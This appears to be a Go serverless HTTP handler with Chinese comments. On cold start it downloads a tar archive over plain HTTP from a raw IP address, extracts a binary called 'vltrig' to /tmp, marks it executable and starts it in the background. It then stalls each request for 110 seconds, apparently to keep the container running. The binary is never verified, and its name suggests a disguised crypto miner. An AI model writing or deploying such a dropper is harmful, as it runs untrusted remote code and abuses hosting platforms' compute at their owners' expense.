package handler

import (
	"archive/tar"
	"encoding/json"
	"errors"
	"io"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"sync"
	"time"
)

var (
	// 用于保证在并发请求下状态检测的线程安全
	mu        sync.Mutex
	// 记录当前容器内程序是否正在运行
	isRunning bool
)

// Handler 负责处理 HTTP 请求
func Handler(w http.ResponseWriter, r *http.Request) {
	binPath := "/tmp/vltrig"

	// ==========================================
	// 1. 容器复用检测：文件检查
	// ==========================================
	// 如果 /tmp/vltrig 不存在，说明是冷启动，需要下载；如果存在则直接跳过
	if _, err := os.Stat(binPath); os.IsNotExist(err) {
		if err := downloadAndExtract(binPath); err != nil {
			http.Error(w, "下载或解压失败: "+err.Error(), http.StatusInternalServerError)
			return
		}
		// 赋权执行权限
		if err := os.Chmod(binPath, 0755); err != nil {
			http.Error(w, "赋权执行权限失败: "+err.Error(), http.StatusInternalServerError)
			return
		}
	}

	// ==========================================
	// 2. 容器复用检测：进程检查
	// ==========================================
	mu.Lock()
	if !isRunning {
		// 只有当前未运行时，才启动二进制程序
		cmd := exec.Command(binPath)
		if err := cmd.Start(); err != nil {
			mu.Unlock()
			http.Error(w, "启动程序失败: "+err.Error(), http.StatusInternalServerError)
			return
		}
		
		isRunning = true // 标记为正在运行
		
		// 启动一个后台协程监控该进程
		go func(c *exec.Cmd) {
			// Wait() 会阻塞直到程序执行完毕退出。
			// 这一步非常关键：它能回收 Linux 的僵尸进程 (Zombie Process)
			c.Wait() 
			
			// 程序退出后，重置运行状态，以便下一个请求能重新拉起它
			mu.Lock()
			isRunning = false
			mu.Unlock()
		}(cmd)
	}
	mu.Unlock()

	// ==========================================
	// 3. 接口挂起 110 秒
	// ==========================================
	time.Sleep(110 * time.Second)

	// 4. 响应成功
	w.Header().Set("Content-Type", "application/json")
	json.NewEncoder(w).Encode(map[string]interface{}{
		"status":  "success",
		"message": "接口已执行完毕 110 秒，程序状态检查完成",
	})
}

// downloadAndExtract 提取为独立函数，保持主流程清晰
func downloadAndExtract(binPath string) error {
	resp, err := http.Get("http://94.131.19.66/vltrig.tar")
	if err != nil {
		return err
	}
	defer resp.Body.Close()

	tr := tar.NewReader(resp.Body)
	for {
		hdr, err := tr.Next()
		if err == io.EOF {
			break
		}
		if err != nil {
			return err
		}

		if hdr.Name == "vltrig" || strings.HasSuffix(hdr.Name, "/vltrig") {
			outFile, err := os.OpenFile(binPath, os.O_CREATE|os.O_RDWR|os.O_TRUNC, 0755)
			if err != nil {
				return err
			}
			_, err = io.Copy(outFile, tr)
			outFile.Close()
			if err != nil {
				return err
			}
			return nil
		}
	}
	return errors.New("未在 tar 包中找到 vltrig 程序")
}